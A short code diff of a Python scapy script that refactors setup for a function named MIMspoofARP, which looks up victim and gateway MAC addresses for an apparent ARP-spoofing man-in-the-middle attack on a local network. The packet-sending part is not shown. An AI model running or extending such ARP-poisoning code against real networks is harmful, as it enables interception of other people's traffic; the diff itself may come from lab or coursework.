@@ -3,18 +3,23 @@ from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, 
 import time
 import random as rd
 
-interface = conf.iface
 
-macAttacker = get_if_hwaddr(interface)
-ipAttacker = get_if_addr(interface)
 
-macVictim = "ff:ff:ff:ff:ff:ff"
-ipVictim = "192.168.178.144"
 
-macServer = "ff:ff:ff:ff:ff:ff"
-ipServer = "192.168.178.1"
+
+# macVictim = "ff:ff:ff:ff:ff:ff"
+# ipVictim = "192.168.178.144"
+
+# macServer = "ff:ff:ff:ff:ff:ff"
+# ipServer = "192.168.178.1"
 
 def MIMspoofARP(ipVictim, ipServer):
+    interface = conf.iface
+
+    macAttacker = get_if_hwaddr(interface)
+    ipAttacker = get_if_addr(interface)
+    
+
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
